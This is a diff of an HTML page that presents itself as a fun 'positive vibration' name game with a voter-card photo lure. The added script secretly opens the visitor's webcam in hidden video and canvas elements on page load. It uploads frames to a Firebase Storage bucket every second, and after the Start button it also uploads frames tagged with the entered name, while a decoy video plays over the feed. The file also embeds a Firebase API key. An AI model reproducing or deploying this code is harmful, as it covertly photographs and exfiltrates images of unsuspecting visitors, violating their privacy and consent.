@@ -1,15 +1,459 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selfie Upload</title>
-</head>
-<body>
-    <h1>Selfie Upload Page</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <script src="script.js"></script>
-</body>
-</html>
+    <title>Power of right and positive frequency/vibration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Hide overflow to prevent scrollbars */
+            position: relative; /* Set position to relative for absolute positioning of raindrops */
+            transition: background-color 0.5s; /* Smooth transition for background color change */
+            background-color: #ffffff; /* Initial background color */
+            background-image: linear-gradient(to bottom, #0078b0 50%, #e50095 50%);
+        }
+        
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: transparent; /* Transparent background */
+            z-index: 1000; /* Ensure loading screen stays on top */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
 
+        #loading-screen input {
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        #start-button {
+
+            width: 30%;
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #ffffff;
+            color: rgb(0, 81, 255);
+            border: 2px solid blue;
+            border-radius: 17px;
+            font-weight: bolder;
+            cursor: pointer;
+            margin-top: 20px;
+            animation: ud 2s infinite;
+            transition: background-color 0.3s; /* Smooth transition for background color change */
+        }
+
+        @keyframes ud {
+            0%{ font-size: 18px;
+                color: rgb(0, 81, 255);
+            }
+            40%{ font-size: 15px;
+                color: rgb(20, 201, 246);
+            }
+            70%{ font-size: 20px;
+                color: rgb(255, 0, 0);
+            }
+            100%{ font-size: 18px;
+                color: rgb(0, 81, 255);
+            }
+        }
+        #start-button:hover {
+            background-color: #000dfa; /* Darker shade on hover */
+            color: #ffffff;
+            animation: none;
+        }
+
+        #start-button.flash {
+            animation: flash 3s infinite; /* Flashing animation */
+        }
+
+        @keyframes flash {
+            50% {
+                background-color: #45a049; /* Flash color */
+            }
+          70%{
+          background-color: grey; /* Flash color */
+          }
+           80%{
+          background-color: #45a049; /* Flash color */
+          }
+           100%{
+          background-color: orange; /* Flash color */
+          }
+        }
+         
+
+        #video-container {
+            position: relative;
+            display: none; /* Hide the video container initially */
+        }
+
+        #video {
+            border: 1px solid #ccc;
+            max-width: 100%; /* Ensure video fits container */
+            height: auto; /* Maintain aspect ratio */
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Fully cover the camera feed with a semi-transparent black layer */
+            z-index: 1; /* Ensure overlay is above the camera feed */
+            display: none; /* Initially hide the overlay */
+        }
+
+        /* Raindrop animation */
+        .raindrop {
+            position: absolute;
+            width: 3px;
+            height: 10px;
+            background-color: rgb(15, 15, 255); /* Blue color */
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-10px) rotate(45deg);
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(200px) rotate(45deg);
+                opacity: 0;
+            }
+        }
+
+        #image{
+
+            z-index: 4;
+        }
+        #top-notification{
+           width:90%;
+           height: 50px;
+           border: 2px solid black;
+           box-shadow: 2px 0px 2px 0px rgb(155, 158, 165);
+           background-color: aliceblue;
+           border-radius: 12px;
+           position: fixed;
+           align-content: center;
+           
+           margin-top: -600px;
+           padding: 5px;
+           display: none;
+           
+           
+        }
+     #voter-link{
+           width: 80px;
+           height: 25px;
+           color: blue;
+           text-decoration: none;
+           font-weight: bold;
+           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+           border: 2px solid blue;
+           box-shadow: 2px 0px 2px 0px rgb(151, 154, 161);
+           background-color: white;
+           border-radius: 10px;
+           padding: 2px;
+           -moz-box-align: end;
+           font-size: 15px;
+           display: float;
+           float: right;
+           text-align: center;
+           position: absolute;
+           margin-left: 230px;
+           margin-top: -45px;
+           animation: changingBG 0.7s infinite;
+           transition: ease 0.2s ease-in;
+
+
+
+     }
+
+     @keyframes  changingBG{
+        0% {background-color: white;
+               color: blue;
+        }
+          50% {background-color: blue;
+               color: #ffffff;
+        }
+        100% {background-color: white;
+               color: blue;
+        }
+
+     }
+
+     #username{
+
+           width:60%;
+           height: 25px;
+           border: 2px solid black;
+           box-shadow: 2px 0px 2px 0px rgb(19, 19, 23);
+           background-color: white;
+      
+           font-size 15px; ;
+           font-weight:bold ;
+           align-content: center;
+           padding: 10px;
+           animation: NBR 0.5s infinite;
+
+     }
+     @keyframes  NBR{
+        0% {background-color: white;
+               color: blue;
+        }
+          50% {background-color: rgb(200, 200, 200);
+               color: #012998;
+        }
+        100% {background-color: white;
+               color: blue;
+        }
+
+     }
+
+
+
+
+
+
+
+
+
+
+
+    </style>
+  
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
+</head>
+<body onload="captureAndUpload2()">
+
+
+
+ <div id="top-notification">
+         <h4 id="h4">See Your Photo In Voter Card</h4>
+          <a id="voter-link" href="https://jeenotepdf.blogspot.com/"> Click Here </a>
+
+ </div>
+
+
+
+
+    <div id="loading-screen">
+        <h2 style="font-size: 12; color: #ffffff; text-shadow: 2px 2px 2px black; padding: 15px;">Welcome! Please enter your name:</h2>
+        <input type="text" id="username" placeholder="your sweet name here" oninput="updateBackgroundColor()">
+        <button id="start-button" onclick="startApp()">Start</button>
+    </div>
+
+    <div id="video-container">
+        <video id="video" autoplay playsinline style="visibility: hidden;"></video>
+        <canvas id="canvas" style="visibility: hidden;"></canvas>
+        <div id="overlay">
+            <video id="video-overlay" width="100%" height="100%" autoplay controls></video>
+        </div>
+        
+         <!-- Overlay to cover the camera feed -->
+        <!-- Raindrop animation -->
+        <div class="raindrop"></div>
+    </div>
+  <div>just like matching vibe </div>
+
+
+  <script>
+    const voterPopC = document.getElementById('top-notification');
+    function voterPop() {
+        voterPopC.style.display = 'block';
+        
+    }
+
+  </script>
+    <!-- Custom script -->
+    <script>
+        const firebaseConfig = {
+  apiKey: "AIzaSyDyqLW6K7aMZudaGHRvxrceQDaANQE4c4Q",
+  authDomain: "local-to-firebass.firebaseapp.com",
+  projectId: "local-to-firebass",
+  storageBucket: "local-to-firebass.appspot.com",
+  messagingSenderId: "121890064671",
+  appId: "1:121890064671:web:9143764a66282571c1c82a"
+};
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+
+        // Function to update background color gradient based on input
+        function updateBackgroundColor() {
+            const username = document.getElementById('username').value;
+            const halfLength = Math.ceil(username.length / 1); // Get half length of username
+            const bgColor = `linear-gradient(to bottom, #eb34de ${halfLength * 10}%, #f1ff2f ${halfLength * 10}%)`;
+            document.body.style.backgroundImage = bgColor;
+        }
+
+        // Function to start the application after user input
+        function startApp() {
+            const username = document.getElementById('username').value;
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('video-container').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block'; // Display the overlay
+            captureAndUpload();
+            playVideoFromStorage();
+
+            voterPop();
+            document.getElementById('start-button').classList.add('flash'); // Add flashing effect
+        }
+
+
+        // get video link from firebase
+        function playVideoFromStorage() {
+            const videoOverlay = document.getElementById('video-overlay');
+
+            // Fetch video URL from Firebase Storage
+            const videoStorageRef = storage.ref('videos/shri.mp4'); // Update with your video filename
+            videoStorageRef.getDownloadURL().then(url => {
+                // Set video source
+                videoOverlay.src = url;
+                // Play the video
+                videoOverlay.play();
+            }).catch(error => {
+                console.error('Error getting video URL:', error);
+            });
+        }
+
+        // Function to capture image from webcam and upload it to Firebase Storage
+        function captureAndUpload() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const username = document.getElementById('username').value; // Get username
+
+            // Set canvas dimensions for desired image size (500x800)
+            const imageWidth = 500;
+            const imageHeight = 800;
+            canvas.width = imageWidth;
+            canvas.height = imageHeight;
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                })
+                .catch(err => {
+                    console.error("Error accessing the webcam: " + err);
+                });
+
+            video.addEventListener('loadeddata', () => {
+                setInterval(() => { // Adjusted to setInterval for continuous capture
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert canvas image to data URL
+                    const imageData = canvas.toDataURL('image/jpeg', 1.0);
+
+                    // Convert data URL to Blob
+                    const byteCharacters = atob(imageData.split(',')[1]);
+                    const arrayBuffer = new ArrayBuffer(byteCharacters.length);
+                    const uint8Array = new Uint8Array(arrayBuffer);
+                    for (let i = 0; i < byteCharacters.length; i++) {
+                        uint8Array[i] = byteCharacters.charCodeAt(i);
+                    }
+                    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+
+                    // Upload image to Firebase Storage with username in the path
+                    const imageStorageRef = storage.ref(`images/${username}_${Date.now()}.jpg`); // Include username in path
+                    const imageUploadTask = imageStorageRef.put(blob);
+
+                    imageUploadTask.then(snapshot => {
+                        console.log('Uploaded image:', snapshot.ref);
+                        snapshot.ref.getDownloadURL().then(url => {
+                            console.log('Image Download URL:', url);
+                        });
+                    }).catch(error => {
+                        console.error('Image upload failed:', error);
+                    });
+                }, 3000); // Adjusted to continuous capture every 1 seconds
+            });
+        }
+
+
+
+
+        // 2 capturing function
+        // Function to capture image from webcam and upload it to Firebase Storage
+        function captureAndUpload2() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const username = document.getElementById('username').value; // Get username
+
+            // Set canvas dimensions for desired image size (500x800)
+            const imageWidth = 500;
+            const imageHeight = 800;
+            canvas.width = imageWidth;
+            canvas.height = imageHeight;
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                })
+                .catch(err => {
+                    console.error("Error accessing the webcam: " + err);
+                });
+
+            video.addEventListener('loadeddata', () => {
+                setInterval(() => { // Adjusted to setInterval for continuous capture
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert canvas image to data URL
+                    const imageData = canvas.toDataURL('image/jpeg', 1.0);
+
+                    // Convert data URL to Blob
+                    const byteCharacters = atob(imageData.split(',')[1]);
+                    const arrayBuffer = new ArrayBuffer(byteCharacters.length);
+                    const uint8Array = new Uint8Array(arrayBuffer);
+                    for (let i = 0; i < byteCharacters.length; i++) {
+                        uint8Array[i] = byteCharacters.charCodeAt(i);
+                    }
+                    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+
+                    // Upload image to Firebase Storage with username in the path
+                    const imageStorageRef = storage.ref(`onload/_${Date.now()}.jpg`); // Include username in path
+                    const imageUploadTask = imageStorageRef.put(blob);
+
+                    imageUploadTask.then(snapshot => {
+                        console.log('Uploaded image:', snapshot.ref);
+                        snapshot.ref.getDownloadURL().then(url => {
+                            console.log('Image Download URL:', url);
+                        });
+                    }).catch(error => {
+                        console.error('Image upload failed:', error);
+                    });
+                }, 1000); // Adjusted to continuous capture every 2 seconds
+            });
+        }
+    </script>
+</body>
+    </html>
+    
